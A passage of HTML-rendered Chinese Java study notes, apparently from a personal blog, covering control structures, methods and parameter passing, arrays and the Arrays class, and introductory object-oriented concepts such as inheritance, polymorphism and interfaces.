<li>语句与语句之间，框与框之间是按从上到下的顺序进行的，它是由若干个依次执行的处理步骤组成的，<strong>它是任何一个算法都离不开的一种基本算法结构</strong> 。</li>
</ul>
<h3 id="3、选择结构"><a href="#3、选择结构" class="headerlink" title="3、选择结构"></a>3、选择结构</h3><ul>
<li><p>if简单选择结构</p>
<ul>
<li><p>我们很多时候去判断一个东西是否可行，可行才能够去执行，这就用到if结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>（布尔表达式）&#123;</span><br><span class="line">	<span class="comment">// 如果布尔表达式为true才执行这个代码块中的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>if双选择结构（也就是if else）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式)&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式为true</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式值为false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>if多选择结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式1为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式2为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(布尔表达式<span class="number">3</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式3为true执行代码</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 如果以上布尔表达式值都不为true执行代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>嵌套的if结构</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(布尔表达式<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// 如果布尔表达式1为true执行代码</span></span><br><span class="line">	<span class="keyword">if</span>(布尔表达式<span class="number">2</span>)&#123;</span><br><span class="line">    	<span class="comment">// 如果布尔表达式2为true执行代码</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>switch多选择结构</p>
<ul>
<li>多选择结构还有一个实现方式就是 switch case语句。</li>
<li>switch case语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>（参数）&#123;</span><br><span class="line">	<span class="keyword">case</span> A:</span><br><span class="line">	<span class="keyword">case</span> B:</span><br><span class="line">	<span class="keyword">case</span> C:</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4、循环结构"><a href="#4、循环结构" class="headerlink" title="4、循环结构"></a>4、循环结构</h3><ul>
<li>while循环</li>
<li>do……while循环</li>
<li>for循环</li>
</ul>
<h3 id="5、break-continue"><a href="#5、break-continue" class="headerlink" title="5、break &amp; continue"></a>5、break &amp; continue</h3><ul>
<li><p>break在任何循环语句的主体部分，均可用 break控制循环的流程。 <strong>break用于强行退出循环</strong>，不执行循环中剩余的语句。（ break语句也在 switch语句中使用）。</p>
</li>
<li><p>continue语句用在循环语句体中，<strong>用于终止某次循环过程</strong>，即跳过循环体中尚未执行的语句，接着进行下一次是否执行循环的判定。</p>
</li>
<li><p>关于goto标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label:</span><br><span class="line">while（或其他循环语句）</span><br></pre></td></tr></table></figure>

<ul>
<li>goto关键字很早就在程序设计语言中出现。尽管goto仍是Java的一个保留字，但并未在语言中得到正式使用；Java没有goto。然而，在 breaki和 continue这两个关键字的身上，我们仍然能看出一些goto的影子—带标签的 break和continue。</li>
<li>“标签”是指后面跟一个冒号的标识符，例如：label；</li>
<li>对Java来说唯一用到标签的地方是在循环语句之前。而在循环之前设置标签的唯一理由是：我们希望在其中嵌套另一个循环，由于 break和 continue关键字通常只中断当前循环，但若随同标签使用，它们就会中断到存在标签的地方。</li>
<li>goto标签由于有一些不好的方面，一般基本不使用</li>
</ul>
</li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="1、何谓方法"><a href="#1、何谓方法" class="headerlink" title="1、何谓方法"></a>1、何谓方法</h3><ul>
<li><p>Java方法是语句得到集合，它们在一起执行一个功能。</p>
<ul>
<li>方法是解决一类问题的步骤的有序组合</li>
<li>发包含于类或对象中</li>
<li>方法在程序中被创建，在其他地方被引用</li>
</ul>
</li>
<li><p>设计方法的原则：方法的本意是功能块，就是实现某个功能的语句块的集合。我们设计方法的时候，最好保持方法的原子性，<strong>就是一个方法只完成1个功能，这样利于我们后期的扩展</strong>。并且对于方法的命名，也尽可能去对应其功能，使其更浅显易懂。</p>
</li>
</ul>
<h3 id="2、方法的定义及调用"><a href="#2、方法的定义及调用" class="headerlink" title="2、方法的定义及调用"></a>2、方法的定义及调用</h3><ul>
<li><p>Java的方法类似于其它语言的函数，是一段<strong>用来完成特定功能的代码片段</strong>，一般情况下，定义一个方法包含以下语法：</p>
</li>
<li><p><strong>方法包含一个方法头和一个方法体</strong>。下面是一个方法的所有部分：</p>
<ul>
<li><strong>修饰符</strong>：修饰符，这是可选的，告诉编译器如何调用该方法。定义了该方法的访问类型。</li>
<li><strong>返回值类型</strong>：方法可能会返回值。 returnValueType是方法返回值的数据类型。有些方法执行所需的操作，但没有返回值。在这种情况下， returnValueType是关键字void。</li>
<li><strong>方法名</strong>：是方法的实际名称。方法名和参数表共同构成方法签名。</li>
<li><strong>参数类型</strong>：参数像是一个占位符。当方法被调用时，传递值给参数。这个值被称为实参或变量。参数列表是指方法的参数类型、顺序和参数的个数。参数是可选的，方法可以不包含任何参数。<ul>
<li>形式参数：在方法被调用时用于接收外界输入的数据。</li>
<li>实参：调用方法时实际传给方法的数据。</li>
</ul>
</li>
<li><strong>方法体</strong>：方法体包含具体的语句，定义该方法的功能。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回值类型 方法名(参数类型 参数名)&#123;</span><br><span class="line">    ...</span><br><span class="line">    方法体</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用方法：对象名.方法名（实参列表）</p>
</li>
<li><p>Java支持两种调用方法的方式，根据方法是否返回值来选择，当方法返回一个值的时候，方法调用通常被当做一个值。</p>
</li>
<li><p>如果返回值为空的话，方法调用一定是一条语句</p>
</li>
</ul>
<blockquote>
<p>注意！！！！！</p>
</blockquote>
<ul>
<li>方法可以修改<strong>传递引用所对应的</strong>变量值，而<strong>不能修改传递值调用</strong>所对应的变量值，这句话相当重要，这是按值调用与引用调用的根本区别，以下为分析：</li>
<li>按值调用(call by value)表示方法接受的时调用者<strong>提供的值</strong>。</li>
</ul>
<p>函数传递值流程图</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/c9ac44a4a04ebd2fd63b7df7de2f2d66--9e4a--image-20240916195454929.png" alt="image-20240916195454929"></p>
<p><strong>分析</strong>：</p>
<ul>
<li>1）value被初始化为x值的一个拷贝（也就是10）</li>
<li>2）value被乘以3后等于30，但注意此时x的值仍为10！</li>
<li>3）这个方法结束后，参数变量value不再使用，被回收。</li>
</ul>
<blockquote>
<p><strong>结论：</strong>当传递方法参数类型为基本数据类型（数字以及布尔值）时，一个方法是不可能修改一个基本数据类型的参数。</p>
</blockquote>
<ul>
<li><p>按引用调用(call by reference)</p>
</li>
<li><p>按引用调用则表示方法接收的是<strong>调用者提供的变量地址</strong>(如果是C语言的话来说就是指针啦，当然java并没有指针的概念)</p>
</li>
<li><p>当然java中除了基本数据类型还有<strong>引用数据类型</strong>，也就是<strong>对象引用</strong>，那么对于这种数据类型又是怎么样的情况呢？我们还是一样先来看一个例子：<br>先声明一个User对象类型： </p>
</li>
<li><p>分析一下这个过程： </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HomeWork02</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">(User student)</span>&#123;</span><br><span class="line">        student.setName(<span class="string">&quot;subeiLY&quot;</span>);</span><br><span class="line">        student.setAge(<span class="number">22</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;SUBEI&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用user前的值:&quot;</span> + user.getName() + <span class="string">&quot;,&quot;</span> + user.getAge());</span><br><span class="line">        updateUser(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;调用user后的值:&quot;</span> + user.getName() + <span class="string">&quot;,&quot;</span> + user.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/1f7caad12229ce68470a87760100bb70--07f4--image-20210414143735613.png" alt="img"></p>
<p><strong>分析</strong>：</p>
<ul>
<li>1）student变量被初始化为user值的拷贝，这里是一个对象的引用。</li>
<li>2）调用student变量的set方法作用在这个引用对象上，<strong>user和student同时引用的User对象内部值</strong>被修改。</li>
<li>3）方法结束后，student变量不再使用，被释放，而user还是没有变，依然指向User对象。</li>
</ul>
<blockquote>
<p><strong>结论：</strong>显然，User的值被改变了，但是这是将最开始所对应得值改变了，把User的本身属性改变了，才会进行值得变化，虽然看似是按引用传递值，但是实际上是将值改变了。 </p>
</blockquote>
<ul>
<li>这个过程也充分说明了java程序设计语言对对象采用的不是引用调用，实际上是<strong>对象引用进行的是值传递</strong>，当然在这里我们可以简单理解为这就是按值调用和引用调用的区别，而且必须明白即使java函数在传递引用数据类型时，也只是拷贝了引用的值罢了，之所以能修改引用数据是因为它们同时指向了一个对象，<strong>但这仍然是按值调用而不是引用调用。</strong></li>
<li><strong>总结</strong><ul>
<li>一个方法不能修改一个基本数据类型的参数（数值型和布尔型）。</li>
<li>一个方法可以修改一个引用所指向的对象状态，但这仍然是按值调用而非引用调用。</li>
<li>上面两种传递都进行了值拷贝的过程。</li>
</ul>
</li>
</ul>
<h3 id="3、方法重载"><a href="#3、方法重载" class="headerlink" title="3、方法重载"></a>3、方法重载</h3><ul>
<li>重载就是在一个类中，有相同的函数名称，但形参不同的函数。</li>
<li>方法的重载的规则<ul>
<li>方法名称必须相同。</li>
<li>参数列表必须不同（个数不同、或类型不同、参数排列顺序不同等）<br>方法的返回类型可以相同也可以不相同。</li>
<li>仅仅返回类型不同不足以成为方法的重载。</li>
</ul>
</li>
<li>实现理论：<ul>
<li>方法名称相同时，编译器会根据调用方法的参数个数、参数类型等去逐个匹配，以选择对应的方法，如果匹配失败，则编译器报错。</li>
</ul>
</li>
</ul>
<h3 id="4、命令行传参"><a href="#4、命令行传参" class="headerlink" title="4、命令行传参"></a>4、命令行传参</h3><ul>
<li>通过main函数中的args去传递参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            System.out.println(arg);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="5、可变参数"><a href="#5、可变参数" class="headerlink" title="5、可变参数"></a>5、可变参数</h3><ul>
<li>JDK1.5开始，Java支持传递同类型的可变参数给一个方法。</li>
<li>在方法声明中，在指定参数类型后加一个省略号（）。</li>
<li>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.github;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test(1,2,3,4,5,6);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void test(int... i)&#123;</span><br><span class="line">        for (int k : i) &#123;</span><br><span class="line">            System.out.println(k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6、递归"><a href="#6、递归" class="headerlink" title="6、递归"></a>6、递归</h3><ul>
<li>A方法调用B方法，我们很容易理解！</li>
<li>递归就是：A方法调用A方法！就是自己调用自己。</li>
<li>利用递归可以用简单的程序来解决一些复杂的问题。它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述岀解题过程所需要的多次重复计算，大大地减少了程序的代码量。递归的能力在于用有限的语句来定义对象的无限集合。</li>
<li>递归结构包括两个部分：<ul>
<li>递归头：什么时候不调用自身方法。如果没有头，将陷入死循环；</li>
<li>递归体：什么时候需要调用自身方法。</li>
</ul>
</li>
</ul>
<p>示例：使用递归求阶乘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(test(<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n*test(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="1、数组概述"><a href="#1、数组概述" class="headerlink" title="1、数组概述"></a>1、数组概述</h3><ul>
<li>数组是相同类型数据的有序集合。</li>
<li>数组描述的是相同类型的若干个数据按照一定的先后次序排列组合而成。</li>
<li>其中每一个数据称作一个数组元素每个数组元素可以通过一个下标来访问它们。</li>
</ul>
<h3 id="2、数组声明创建"><a href="#2、数组声明创建" class="headerlink" title="2、数组声明创建"></a>2、数组声明创建</h3><ul>
<li>首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataType[] arrayRefVar;	<span class="comment">// 首选的方法</span></span><br><span class="line">或</span><br><span class="line">dataType arrayRefVar[];	<span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Java语言使用new操作符来创建数组，语法如下：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataType[] arrayRefVar = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure>

<ul>
<li>数组的元素是通过索引访问的，数组索引从0开始。</li>
<li>获取数组长度：<code>arrays. length</code></li>
</ul>
<blockquote>
<p>内存分析</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/6cadde5fb4d27323c285b0d428245dc7--4b48--image-20240916214245870.png" alt="image-20240916214245870"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/5c5632e65292b3883e07b66cefa2c846--395e--1622105878156.png" alt="1622105878156"></p>
<blockquote>
<p>数组的四个基本特点：</p>
</blockquote>
<ul>
<li>其长度是确定的。数组一旦被创建，它的大小就是不可以改变的；</li>
<li>其元素必须是相同类型不允许出现混合类型。</li>
<li>数组中的元素可以是任何数据类型，包括基本类型和引用类型。</li>
<li>数组变量属引用类型，数组也可以看成是对象，数组中的每个元素相当于该对象的成员变量数组本身就是对象，Java中对象是在堆中的，因此数组无论保存原始类型还是其他对象类型，&#x3D;&#x3D;数组对象本身是在堆中的&#x3D;&#x3D;。</li>
</ul>
<blockquote>
<p>下标越界及小结：</p>
</blockquote>
<ul>
<li>下标的合法区间：[0, length-1]，如果越界就会报错：</li>
</ul>
<p>数组的下标异常：</p>
<ul>
<li><p>ArraylndexOutofBounds Exception：数组下标越界异常！</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/ef136c0b0a60d13a465c9eabf4a507c3--9a6b--1622108608331.png" alt="1622108608331"></p>
</li>
<li><p>数组是相同数据类型（数据类型可以为任意类型）的有序集合数组也是对象。</p>
</li>
<li><p>数组元素相当于对象的成员变量。</p>
</li>
<li><p>数组长度的确定的，不可变的。如果越界，则报：ArrayIndexOutofBounds。</p>
</li>
</ul>
<h3 id="3、数组使用"><a href="#3、数组使用" class="headerlink" title="3、数组使用"></a>3、数组使用</h3><ul>
<li><p>普通的for循环</p>
</li>
<li><p>For-Each循环</p>
</li>
<li><p>数组作方法入参</p>
</li>
<li><p>数组作返回值</p>
</li>
</ul>
<h3 id="4、多维数组"><a href="#4、多维数组" class="headerlink" title="4、多维数组"></a>4、多维数组</h3><ul>
<li>多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组。</li>
<li>二维数组</li>
</ul>
<h3 id="5、Arrays类"><a href="#5、Arrays类" class="headerlink" title="5、Arrays类"></a>5、Arrays类</h3><ul>
<li>数组的工具类 javautil. Arrays</li>
<li>由于数组对象本身并没有什么方法可以供我们调用但AP中提供了一个工具类 Arrays供我们使用从而可以对数据对象进行一些基本的操作。</li>
<li>&#x3D;&#x3D;查看JDK帮助文档&#x3D;&#x3D;。</li>
<li>Arrays类中的方法都是 static 修饰的静态方法在使用的时候可以直接使用类名进行调用，而”不用”使用对象来调用（注意：是“不用”而不是“不能”）。</li>
<li>具有以下常用功能：<ul>
<li>给数组赋值：通过fill方法。</li>
<li>对数组排序：通过sort方法按升序。</li>
<li>比较数组：通过 equals方法比较数组中元素值是否相等。</li>
<li>查找数组元素：通过 binarySearch方法能对排序好的数组进行二分查找法操作。</li>
</ul>
</li>
</ul>
<p>一些常用的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名	简要描述</span><br><span class="line">asList()	返回由指定数组支持的固定大小的列表。</span><br><span class="line">sort()	将数组排序（升序）</span><br><span class="line">parallelSort()	将指定的数组按升序排序</span><br><span class="line">binarySearch()	使用二分搜索法快速查找指定的值（前提是数组必须是有序的）</span><br><span class="line">compare()	按字典顺序比较两个数组</span><br><span class="line">compareUnsigned()	按字典顺序比较两个数组，将数字元素处理为无符号</span><br><span class="line">copyOf()	填充复制数组</span><br><span class="line">copyOfRange()	将数组的指定范围复制到新数组</span><br><span class="line">equals()	比较两个数组</span><br><span class="line">deepEquals()	比较两个数组深度</span><br><span class="line">toString()	将数组转换为字符串</span><br><span class="line">deepToString()	将一个多维数组转换为字符串</span><br><span class="line">fill()	将指定元素填充给数组每一个元素</span><br><span class="line">mismatch()	查找并返回两个数组之间第一个不匹配的索引，如果未找到则返回-<span class="number">1</span></span><br><span class="line">parallelPrefix()	使用提供的函数对数组元素进行操作</span><br><span class="line">parallelSetAll()	使用提供的生成器函数并行设置指定数组的所有元素以计算每个元素</span><br><span class="line">setAll()	使用提供的生成器函数设置指定数组的所有元素以计算每个元素</span><br></pre></td></tr></table></figure>

<h3 id="6、稀疏数组"><a href="#6、稀疏数组" class="headerlink" title="6、稀疏数组"></a>6、稀疏数组</h3><ul>
<li>当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组。</li>
<li>稀疏数组的处理方式是：<ul>
<li>记录数组一共有几行几列，有多少个不同值。</li>
<li>把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模。</li>
</ul>
</li>
<li>如下图：左边是原始数组，右边是稀疏数组。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/f536e2a3282130e263ee9de36e64baaa--4d2b--1622349200598.png" alt="1622349200598"></p>
<h2 id="面向对象（OOP）"><a href="#面向对象（OOP）" class="headerlink" title="面向对象（OOP）"></a>面向对象（OOP）</h2><h3 id="1、初始面向对象"><a href="#1、初始面向对象" class="headerlink" title="1、初始面向对象"></a>1、初始面向对象</h3><ul>
<li>面向过程思想<ul>
<li>步骤清晰简单，第一步做什么，第二步做什么…</li>
<li>面对过程适合处理一些较为简单的问题。</li>
</ul>
</li>
<li>面向对象思想<ul>
<li>物以类聚，分类的思维模式，思考问题首先会解决问题需要哪些分类，然后对这些分类进行单独思考。最后，才对某个分类下的细节进行面向过程的思索。</li>
<li>面向对象适合处理复杂的问题，适合处理需要多人协作的问题！</li>
</ul>
</li>
<li>对于描述复杂的事物，为了从宏观上把握、从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是，具体到微观操作，仍然需要面向过程的思路去处理。</li>
<li>面向对象编程（ Object- Oriented Programming,OOP）</li>
<li>面向对象编程的本质就是：&#x3D;&#x3D;以类的方式组织代码，以对象的组织（封装）数据&#x3D;&#x3D;。</li>
<li>三大特征：<ul>
<li><strong>继承</strong></li>
<li><strong>封装</strong></li>
<li><strong>多态</strong></li>
</ul>
</li>
<li>从认识论角度考虑是先有对象后有类。对象，是具体的事物。类，是抽象的，是对对象的抽象。</li>
<li>从代码运行角度考虑是先有类后有对象。类是对象的模板。</li>
</ul>
<h3 id="2、方法的回顾和加深"><a href="#2、方法的回顾和加深" class="headerlink" title="2、方法的回顾和加深"></a>2、方法的回顾和加深</h3><ul>
<li><p>方法的定义</p>
<ul>
<li>修饰符</li>
<li>返回类型</li>
<li>break：跳出 switch，结束循环和 return的区别。</li>
<li>方法名：注意规范就OK，见名知意</li>
<li>参数列表：(参数类型，参数名) …</li>
<li>异常抛出：疑问，参考下文！</li>
</ul>
</li>
<li><p>方法的调用</p>
<ul>
<li>静态方法（可以直接调用）</li>
<li>非静态方法（需要new对象才能调用）</li>
<li>形参和实参</li>
<li>值传递和引用传递</li>
<li>this关键字（表示当前所在类）</li>
</ul>
</li>
</ul>
<h3 id="3、对象的创建分析"><a href="#3、对象的创建分析" class="headerlink" title="3、对象的创建分析"></a>3、对象的创建分析</h3><ul>
<li>类是一种抽象的数据类型它是对某一类事物整体描述&#x2F;定义但是并不能代表某一个具体的事物。</li>
<li>使用new关键字创建对象。</li>
<li>使用new关键字创建的时候，除了分配内存空间之外，还会给刨建好的对象进行默认的初始化以及对类中构造器的调用。</li>
<li>类中的构造器也称为构造方法，是在进行创建对象的时候必须要调用的。并且构造器有以下俩个特点：<ul>
<li>1.必须和类的名字相同；</li>
<li>2.必须没有返回类型也不能写void。</li>
</ul>
</li>
<li>构造器：<ul>
<li>1.和类名初问</li>
<li>2.没有返回值</li>
</ul>
</li>
<li>作用：<ul>
<li>1.new本质在调用构造方法；</li>
<li>2.初始化对象的值。</li>
</ul>
</li>
<li>注意：定义有参构造之后，如果想使用无参构造，显示的定义一个无参构造。</li>
</ul>
<h3 id="4、面向对象三大特性"><a href="#4、面向对象三大特性" class="headerlink" title="4、面向对象三大特性"></a>4、面向对象三大特性</h3><blockquote>
<p>封装：<strong>属性私有，get&#x2F;set</strong></p>
</blockquote>
<p>封装的作用：</p>
<ul>
<li>提高了代码的安全性，保护数据；</li>
<li>隐藏代码的实现细则；</li>
<li>统一接口；</li>
<li>系统可维护增加了。</li>
</ul>
<blockquote>
<p>继承：<strong>object类、super、方法重写</strong></p>
</blockquote>
<ul>
<li>继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。</li>
<li>extands的意思是“扩展”。子类是父类的扩展。</li>
<li><strong>JAVA中类只有单继承，没有多继承！</strong></li>
<li>继承是类和类之间的一种关系。除此之外，类和类之间的关系还有依赖、组合、聚合等。</li>
<li>继承关系的俩个类，一个为子类（派生类），一个为父类（基类）。子类继承父类使用关键字 extends来表示。</li>
<li>子类和父类之间从意义上讲应该具有”is a”的关系。</li>
<li>私有的东西无法被继承！！！</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">super注意点：</span><br><span class="line"></span><br><span class="line">1. super调用父类的构造方法，必须在构造方法的第一个</span><br><span class="line">2. super必须只能出现在子类的方法或者构造方法中！</span><br><span class="line">3. super和this不能同时调用构造方法！</span><br><span class="line"></span><br><span class="line">super VS this</span><br><span class="line">- 代表的对象不同：</span><br><span class="line">  - this：本身调用者这个对象；</span><br><span class="line">  - super：代表父类对象的应用；</span><br><span class="line">- 前提</span><br><span class="line">  - this：没有继承也可以使用；</span><br><span class="line">  - super：只能在继承条件才可以使用；</span><br><span class="line">- 构造方法</span><br><span class="line">  - this（）：本类的构造；</span><br><span class="line">  - super（）：父类的构造。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>方法的重写</p>
</li>
<li><p>重写：需要有继承关系，子类重写父类的方法！</p>
</li>
</ul>
<ol>
<li>方法名必须相同;</li>
<li>参数列表列表必须相同;</li>
<li>修饰符：范围可以扩大但不能缩小: public&gt;Protected&gt;Default&gt;private</li>
<li>抛出的异常：范围，可以被缩小，但不能扩大；ClassNotFoundException–&gt; Exception(大)</li>
</ol>
<ul>
<li>重写，子类的方法和父类必要一致；方法体不同！</li>
<li>为什么需要重写：父类的功能，子类不一定需要，或者不一定满足！</li>
</ul>
<blockquote>
<p>多态</p>
</blockquote>
<ul>
<li>即同一方法可以根据发送对象的不同而采用多种不同的行为方式。</li>
<li>一个对象的实际类型是确定的，但可以指向对象的引用的类型有很多。</li>
<li>多态存在的条件：<ul>
<li>有继承关系；</li>
<li>子类重写父类方法；</li>
<li>父类引用指向子类对象。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 多态注意事项：</span><br><span class="line">  1. 多态是方法的多态，属性没有多态；</span><br><span class="line">  2. 父类和子类，有联系，类型转换异常！ClassCastException!</span><br><span class="line">  3. 存在条件：继承条件，方法需要重写！父类引用指向子类对象！</span><br><span class="line">     1. static 方法，属于类，它不属于实例</span><br><span class="line">     2. final 常量；</span><br><span class="line">     3. private 方法；</span><br><span class="line"></span><br><span class="line">instanceof：判断一个对象是什么类型。</span><br></pre></td></tr></table></figure>

<ul>
<li>匿名代码块<ul>
<li>在类创建对象时执行</li>
<li>在构造方法前执行，在静态代码块后执行</li>
</ul>
</li>
<li>静态代码块<ul>
<li>只会在类初次创建对象时执行</li>
<li>在构造方法、静态代码块前执行</li>
</ul>
</li>
</ul>
<h3 id="5、抽象类和接口"><a href="#5、抽象类和接口" class="headerlink" title="5、抽象类和接口"></a>5、抽象类和接口</h3><blockquote>
<p>抽象类</p>
</blockquote>
<ul>
<li>abstract修饰符可以用来修饰方法也可以修饰类如果修饰方法那么该方法就是抽象方法如果修饰类那么该类就是抽象类。</li>
<li>抽象类中可以没有抽象方法但是有抽象方法的类一定要声明为抽象类。</li>
<li>抽象类，不能使用new关键字来创建对象它是用来让子类继承的。</li>
<li>抽象方法只有方法的声明没有方法的实现它是用来让子类实现的。</li>
<li>子类继承抽象类那么就必须要实现抽象类没有实现的抽象方法否则该子类也要声明为抽象类。</li>
</ul>
<blockquote>
<p>接口</p>
</blockquote>
<ul>
<li>普通类：只有具体实现；</li>
<li>抽象类：具体实现和规范（抽象方法）都有！</li>
<li>接口：只有规范！</li>
<li>接口就是规范，定义的是一组规则，体现了现实世界中“如果你是…则必须能…”的思想。如果你是天使，则必须能飞。如果你是汽车，则必须能跑。如果你好人，则必须干掉坏人；如果你是坏人，则必须欺负好人。</li>
<li>接口的本质是契约，就像我们人间的法律一样。制定好后大家都遵守。</li>
<li>OO的精髓，是对对象的抽象，最能体现这一点的就是接口。为什么我们讨论设计模式都只针对具备了抽象能力的语言（比如c++、java、c#等），就是因为设计模式所硏究的，实际上就是如何合理的去抽象。</li>
<li><strong>声明类的关键字是 class，声明接口的关键字是 interface。</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抽象类和接口的区别：</span><br><span class="line">- 抽象类：具体实现和规范（抽象方法）都有！</span><br><span class="line">- 接口：只有规范！</span><br></pre></td></tr></table></figure>

<h3 id="6、内部类及OOP实战"><a href="#6、内部类及OOP实战" class="headerlink" title="6、内部类及OOP实战"></a>6、内部类及OOP实战</h3><p>内部类就是在一个类的内部在定义一个类，比如，A类中定义一个B类，那么B类相对A类来说就称为内部类，而A类相对B类来说就是外部类了。</p>
<ol>
<li>成员内部类</li>
<li>静态内部类</li>
<li>局部内部类</li>
<li>匿名内部类</li>
</ol>
